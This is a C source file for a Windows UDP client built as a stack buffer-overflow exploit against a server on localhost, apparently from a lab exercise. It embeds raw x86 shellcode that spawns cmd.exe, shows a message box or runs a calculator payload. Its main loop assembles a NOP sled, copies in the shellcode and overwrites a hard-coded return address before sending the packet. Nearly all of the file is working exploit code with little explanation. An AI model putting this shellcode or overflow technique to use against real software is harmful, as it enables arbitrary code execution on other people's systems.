﻿/* client source code */
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

SOCKET sock;

#if defined(_MSC_VER)
FILE *fopen_wrap(const char *p_filename, const char *p_mode)
{
  FILE *fp;
  fopen_s(&fp, p_filename, p_mode);
  return fp;
}
#define fopen(f, m) fopen_wrap(f, m)
#endif

/**
* load file to memory
*/
bool file_to_memory(char *p_dst, size_t maxlen, size_t *p_dst_len, const char *p_filename)
{
  FILE *fp = fopen(p_filename, "rb");
  if (!fp) {
    printf("failed to load file %s\n", p_filename);
    return false;
  }

  fseek(fp, 0, SEEK_END);
  *p_dst_len = (size_t)ftell(fp);
  fseek(fp, 0, SEEK_SET);
  if (fread(p_dst, 1, *p_dst_len, fp) != *p_dst_len) {
    printf("reading file failed\n");
    return false;
  }
  fclose(fp);
  return true;
}

// breakpoints
char code34[] =
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC";

//cmd
char code12[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

// msgbox
char code56754[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b"
"\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06"
"\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03"
"\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b"
"\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca"
"\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b"
"\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3"
"\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55"
"\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x55"
"\x73\x65\x72\x54\xff\x55\x10\x89\xc3\x68\xa8\xa2\x4d\xbc\xff\x55\x04\x89"
"\x45\x18\x31\xc0\x66\xb8\x73\x73\x50\x68\x70\x31\x6e\x33\x68\x20\x68\x34"
"\x70\x68\x64\x20\x62\x79\x68\x50\x77\x6e\x33\x54\x8b\x1c\x24\x31\xc0\x50"
"\x53\x53\x50\xff\x55\x18\x31\xc0\x50\x6a\xff\xff\x55\x14";

//my calc
char code[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x57\x56\x53\x51\x83"
"\xec\x58\xe8\x00\x00\x00\x00\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\xc6\x45"
"\xd7\x57\xc6\x45\xd8\x69\xc6\x45\xd9\x6e\xc6\x45\xda\x45\xc6\x45\xdb\x78"
"\x8b\x40\x0c\xc6\x45\xdc\x65\xc6\x45\xdd\x63\xc6\x45\xde\x00\xc7\x45\xc4"
"\x00\x00\x00\x00\x8b\x00\x8b\x00\x8b\x40\x18\x8b\x50\x3c\x8b\x5c\x10\x78"
"\x01\xc3\x8b\x73\x20\x8b\x7b\x24\x01\xc6\x01\xc7\x89\x75\xc0\x8b\x73\x18"
"\x89\x7d\xbc\x89\x75\xb8\x8b\x4d\xc4\x8b\x75\xb8\x01\xc9\x03\x4d\xbc\x39"
"\x75\xc4\x89\x4d\xb4\x74\x3c\x8b\x4d\xc4\x8b\x7d\xc0\x89\xc6\x03\x34\x8f"
"\x8d\x4d\xd7\x8d\x55\xd7\x89\xcf\x29\xd7\x8a\x14\x37\x84\xd2\x74\x07\x3a"
"\x11\x75\x03\x41\xeb\xeb\x38\x11\x75\x10\x8b\x4d\xb4\x0f\xb7\x11\x8d\x14"
"\x90\x03\x53\x1c\x03\x02\xeb\x07\xff\x45\xc4\xeb\xb1\x31\xc0\x8d\x7d\xdf"
"\xbe\x00\x00\x00\x00\xb9\x09\x00\x00\x00\xf3\xa4\x8d\x55\xdf\xc7\x44\x24"
"\x04\x05\x00\x00\x00\x89\x14\x24\xff\xd0\x50\x50\xeb\xfe\x90\x90";

int main()
{
  char    data[2048];
  size_t  data_size;
  WSAData wsadata;

  if (WSAStartup(MAKEWORD(2, 2), &wsadata)) {
    printf("failed to intiialize windows sockets api\n");
    return 1;
  }

  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock == SOCKET_ERROR) {
    printf("failed to open socket. LastError() = %d\n", WSAGetLastError());
    return 1;
  }

  sockaddr_in localaddr;
  localaddr.sin_family = AF_INET;
  localaddr.sin_addr.s_addr = INADDR_ANY;
  localaddr.sin_port = 26000;
  if (bind(sock, (sockaddr *)&localaddr, sizeof(localaddr)) == SOCKET_ERROR) {
    printf("failed to bind socket. LastError() = %d\n", WSAGetLastError());
    return 1;
  }

  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  addr.sin_port = 27000;

  printf("client started\n");
  while (1) {
    printf("resend file data? "); 
    getchar();

#define METHOD 1

#if METHOD == 0
    if (file_to_memory(data, sizeof(data), &data_size, "dataforsend.bin")) {
      sendto(sock, data, data_size, 0, (sockaddr *)&addr, sizeof(addr));
      printf(" %zd bytes sent to server\n", data_size);
    }
#elif METHOD == 1
    /* test 2 */
    size_t return_addr_offset = 12;
#if ADJUST_OFFSET
    printf("type offset: ");
    scanf("%zd", &return_addr_offset);
    printf("offset is: %zd\n", return_addr_offset);
#else
    printf("send exploit? ");
    getchar();
#endif

    const size_t server_buf_size = 1024;
    const size_t shell_size = sizeof(code);
    const size_t shell_start_offset = server_buf_size - shell_size;
    const size_t total_packet_size = shell_start_offset + shell_size + return_addr_offset + sizeof(void *);
    memset(data, 0x90, shell_start_offset); // set NOPs
    memcpy(&data[shell_start_offset], code, shell_size); // copy shellcode

    // 0x0019F954 buf start
    // 0x0019FC45
    *((size_t *)&data[shell_start_offset + shell_size + return_addr_offset]) = 0x0019F956;; // set return address
    sendto(sock, data, (int)total_packet_size, 0, (sockaddr *)&addr, sizeof(addr));
    printf(" %zd bytes sent to server\n", total_packet_size);
#elif METHOD == 2
    const size_t size = 1024;
    memset(data, 0xCC, size); // set breakpoints
    sendto(sock, data, (int)size, 0, (sockaddr *)&addr, sizeof(addr));
    printf(" %zd bytes sent to server\n", size);
#endif
  }
  closesocket(sock);
  WSACleanup();
  return 0;
}